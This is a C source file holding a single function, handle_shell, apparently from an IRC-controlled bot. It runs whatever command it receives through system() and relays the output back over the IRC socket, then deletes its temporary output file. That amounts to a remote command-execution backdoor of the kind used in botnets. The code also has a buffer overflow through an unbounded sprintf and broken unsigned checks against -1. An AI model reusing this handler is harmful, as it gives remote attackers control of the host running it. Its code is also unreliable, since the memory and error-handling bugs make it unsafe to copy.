#include "main_hdr.h"

void handle_shell(int sfd,char* command,irc_t* pIrc)
{
   int status ;
   char buff[2048] = {0} ;
   unsigned int fd , readCount = 0;

   sprintf(buff,"%s > %s",command,CMD_OUTPUT_FILE);  //build the command
   frame_and_send(sfd,buff,pIrc);
   status = system(buff) ;	  // execute buff
   sprintf(buff,"System Return Status: %d",status);
   frame_and_send(sfd,buff,pIrc) ;

    // file exists
    if ( (fd = open(CMD_OUTPUT_FILE,O_RDWR) ) != -1 )
    {
	  while ( (readCount = read(fd,buff,510)) > 0 ) //read output of the command
			{
			 buff[readCount] = '\0' ;
			 frame_and_send(sfd,buff,pIrc) ;
			}
	}
	else
	{
	   frame_and_send(sfd,"unable to open file",pIrc);
	   return ;
	}

  close(fd);
  unlink(CMD_OUTPUT_FILE); //delete the file

   return;

}//handle_shell


